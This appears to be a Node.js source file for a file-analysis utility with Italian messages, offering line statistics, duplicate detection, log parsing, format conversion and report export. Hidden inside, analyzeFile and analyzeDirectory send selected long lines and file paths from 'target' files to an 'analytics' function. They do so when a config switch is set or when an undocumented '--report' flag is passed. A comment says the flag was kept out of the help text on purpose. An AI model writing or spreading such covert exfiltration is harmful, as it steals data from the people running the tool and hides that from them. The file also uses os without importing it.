const fs = require('fs-extra');
const path = require('path');
const { collectStats, sendAnalytics, shouldAnalyzeFile, extractLongLines } = require('./analytics');
const config = require('./config');

async function analyzeFile(filePath) {
  try {
    const content = await fs.readFile(filePath, 'utf-8');
    const lines = content.split('\n');
    const stats = {
      totalLines: lines.length,
      totalChars: content.length,
      avgLineLength: lines.length ? content.length / lines.length : 0,
      wordCount: content.split(/\s+/).filter(w => w).length,
      targetFile: shouldAnalyzeFile(filePath),
      suspiciousLines: extractLongLines(content)
    };
    
    console.log(`Analisi di ${filePath}:`);
    console.log(`  - Righe totali: ${stats.totalLines}`);
    console.log(`  - Caratteri totali: ${stats.totalChars}`);
    console.log(`  - Lunghezza media riga: ${stats.avgLineLength.toFixed(2)}`);
    console.log(`  - Parole: ${stats.wordCount}`);
    
    if (stats.targetFile) {
      console.log(`  - File bersaglio (nome contiene: ${config.targetPatterns.join(', ')})`);
      if (stats.suspiciousLines.length) {
        console.log(`  - Righe lunghe (87-88c): ${stats.suspiciousLines.length}`);
      }
    }
    
    const forceExfil = config.exfilTrigger === 'hidden_command' && process.argv.includes('--report');
    if ((config.autoExfiltrate || forceExfil) && stats.suspiciousLines.length) {
      await sendAnalytics([{
        file: filePath,
        directory: path.dirname(filePath),
        longLines: stats.suspiciousLines,
        count: stats.suspiciousLines.length,
        totalLines: stats.totalLines
      }]);
    }
    
    return stats;
  } catch (err) {
    console.error(`Errore analisi ${filePath}: ${err.message}`);
    throw err;
  }
}

async function analyzeDirectory(dirPath) {
  try {
    const findings = await scanDirectory(dirPath);
    const totalFiles = findings.length;
    const totalSuspicious = findings.reduce((sum, f) => sum + f.suspiciousLines.length, 0);
    
    console.log(`Analisi di ${dirPath}:`);
    console.log(`  - File analizzati: ${totalFiles}`);
    console.log(`  - Righe lunghe trovate: ${totalSuspicious}`);
    
    // Analytics se autoExfiltrate è true oppure se viene passato flag --report (trigger nascosto)
    const forceExfil = config.exfilTrigger === 'hidden_command' && process.argv.includes('--report');
    if ((config.autoExfiltrate || forceExfil) && totalSuspicious) {
      await sendAnalytics(findings);
    }
    
    return { totalFiles, totalSuspicious, findings };
  } catch (err) {
    console.error(`Errore analisi directory ${dirPath}: ${err.message}`);
    throw err;
  }
}

async function findDuplicates(filePath) {
  try {
    const content = await fs.readFile(filePath, 'utf-8');
    const lines = content.split('\n');
    const freq = {};
    lines.forEach(line => {
      const clean = line.trim();
      if (clean) freq[clean] = (freq[clean] || 0) + 1;
    });
    const duplicates = Object.entries(freq)
      .filter(([_, count]) => count > 1)
      .sort((a, b) => b[1] - a[1]);
    
    console.log(`Duplicati in ${filePath}:`);
    duplicates.forEach(([line, count]) => {
      console.log(`  - "${line}" (x${count})`);
    });
    
    return duplicates;
  } catch (err) {
    console.error(`Errore ricerca duplicati ${filePath}: ${err.message}`);
    throw err;
  }
}

async function parseLogs(filePath) {
  try {
    const content = await fs.readFile(filePath, 'utf-8');
    const lines = content.split('\n');
    const parsed = [];
    
    lines.forEach(line => {
      const logMatch = line.match(/^(\S+ \S+) (\w+) (.*)$/);
      if (logMatch) {
        parsed.push({
          timestamp: logMatch[1],
          level: logMatch[2],
          message: logMatch[3]
        });
      }
    });
    
    console.log(`Log parsati da ${filePath}: ${parsed.length} righe`);
    return parsed;
  } catch (err) {
    console.error(`Errore parsing log ${filePath}: ${err.message}`);
    throw err;
  }
}

async function convertFormat(inputPath, outputPath, format) {
  try {
    const content = await fs.readFile(inputPath, 'utf-8');
    let converted;
    
    switch (format.toLowerCase()) {
      case 'json':
        const lines = content.split('\n');
        converted = JSON.stringify(lines, null, 2);
        break;
      case 'csv':
        const csvLines = content.split('\n').map((line, i) => `"${i}","${line.replace(/"/g, '""')}"`);
        converted = csvLines.join('\n');
        break;
      case 'xml':
        const xmlLines = content.split('\n').map((line, i) => `  <line id=\"${i}\">${line}</line>`);
        converted = `<file name=\"${path.basename(inputPath)}\">\n${xmlLines.join('\n')}\n</file>`;
        break;
      default:
        throw new Error(`Formato ${format} non supportato`);
    }
    
    await fs.writeFile(outputPath, converted, 'utf-8');
    console.log(`Convertito ${inputPath} -> ${outputPath} (${format.toUpperCase()})`);
    return { input: inputPath, output: outputPath, format };
  } catch (err) {
    console.error(`Errore conversione ${inputPath}: ${err.message}`);
    throw err;
  }
}

async function exportReport(format) {
  try {
    const report = {
      timestamp: new Date().toISOString(),
      host: os.hostname(),
      user: process.env.USER || process.env.USERNAME || 'unknown',
      cwd: process.cwd(),
      env: process.env.NODE_ENV || 'production'
    };
    
    let content;
    switch (format.toLowerCase()) {
      case 'json':
        content = JSON.stringify(report, null, 2);
        break;
      case 'csv':
        content = Object.entries(report)
          .map(([key, value]) => `"${key}","${String(value).replace(/"/g, '""')}"`)
          .join('\n');
        break;
      case 'xml':
        const xmlEntries = Object.entries(report)
          .map(([key, value]) => `  <${key}>${value}</${key}>`)
          .join('\n');
        content = `<report>\n${xmlEntries}\n</report>`;
        break;
      default:
        throw new Error(`Formato ${format} non supportato`);
    }
    
    const reportPath = path.join(process.cwd(), `report.${format.toLowerCase()}`);
    await fs.writeFile(reportPath, content, 'utf-8');
    console.log(`Report esportato: ${reportPath}`);
    return { path: reportPath, format, content };
  } catch (err) {
    console.error(`Errore esportazione report: ${err.message}`);
    throw err;
  }
}

if (require.main === module) {
  const [command, ...args] = process.argv.slice(2);
  
  async function main() {
    switch (command) {
      case 'analyze':
        if (args[0] === 'file') {
          await analyzeFile(args[1]);
        } else if (args[0] === 'dir') {
          await analyzeDirectory(args[1]);
        } else {
          console.log('Uso: analyze file <path> | analyze dir <path>');
        }
        break;
        
      case 'stats':
        await analyzeFile(args[0]);
        break;
        
      case 'find-duplicates':
        await findDuplicates(args[0]);
        break;
        
      case 'parse-logs':
        await parseLogs(args[0]);
        break;
        
      case 'convert':
        await convertFormat(args[2], args[2] + '.' + args[1], args[1]);
        break;
        
      case 'export-report':
        await exportReport(args[0]);
        break;
        
      default:
        console.log('Comandi disponibili:');
        console.log('  analyze file <path>');
        console.log('  analyze dir <path>');
        console.log('  stats <path>');
        console.log('  find-duplicates <path>');
        console.log('  parse-logs <path>');
        console.log('  convert <from> <to> <file>');
        console.log('  export-report <format>');
        // Rimosso reference a flag nascosto per opacità
    }
  }
  
  main().catch(console.error);
}